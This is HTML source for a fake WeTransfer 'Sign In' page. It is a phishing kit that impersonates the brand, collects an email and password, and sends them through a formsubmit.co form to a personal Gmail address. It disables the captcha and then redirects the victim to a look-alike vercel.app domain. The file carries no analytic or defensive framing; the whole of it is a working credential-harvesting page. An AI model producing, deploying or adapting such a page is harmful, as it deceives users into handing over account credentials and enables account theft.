<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Wetransfer</title>

<link href="[fonts.googleapis.com](https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap)" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Poppins',sans-serif;
}

/* Global reset stays as-is */

/* Layout */
body{
  background:#f4f4f4;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  padding:20px;
}

.wrapper{
  width:100%;
  max-width:420px;         /* allow a wider layout on normal phones */
  background:#f4f4f4;
  text-align:center;
  margin:0 auto;
  padding:0 12px;           /* small side padding so inputs don’t touch edges */
}

.input-group{
  margin-bottom:22px;
}

.input-group input{
  width:100%;
  max-width:100%;
  padding:24px 20px;       /* slightly smaller padding helps on small screens */
  border:2px solid #d9d9d9;
  border-radius:20px;
  background:#fff;
  font-size:18px;
  outline:none;
  transition:0.3s ease;
}

/* Buttons */
.btn{
  width:100%;
  padding:18px;
  border:none;
  border-radius:20px;
  background:#3567f2;
  color:#fff;
  font-size:22px;
  font-weight:500;
  cursor:pointer;
  transition:0.3s ease;
  margin-top:5px;
}

/* Typographic scales can stay, but tune tiny breakpoints */
@media (max-width: 480px){
  .logo{ font-size:clamp(36px, 9vw, 56px); }
  .title{ font-size:clamp(18px, 6vw, 26px); }
  .subtitle{ font-size:clamp(10px, 3.2vw, 13px); }
}

/* Very small devices */
@media (max-width: 420px){
  body{ padding:15px; }
  .wrapper{ padding:15; }
  .input-group input{
    padding:14px 16px;
    font-size:16px;
  }
  .btn{
    font-size:18px;
    padding:14px;
  }
}

</style>
</head>
<body>

<div class="wrapper">

  <img src="logo.08he3n6vuv2qc (1).svg">
  <div class="title">Sign In</div>
  <div class="subtitle">to continue to your WeTransfer account.</div>

  <!-- ✅ FormSubmit Integration -->
  <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">


    <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
    <input type="hidden" name="_captcha" value="false">

    <div class="input-group">
      <input type="email" name="email" placeholder="Enter email" required>
    </div>

    <div class="input-group">
      <input type="password" name="password" placeholder="Type your password..." required>
    </div>

    <button type="submit" class="btn">Continue</button>
  </form>

  <div class="links">
    <a href="#">Forgot password?</a>
    <a href="#">Use a different email?</a>
  </div>

  <div class="divider"><span>or</span></div>

  <div class="bottom-text">
    Receive a <a href="#">temporary code via email</a>
  </div>

</div>

</body>
</html>
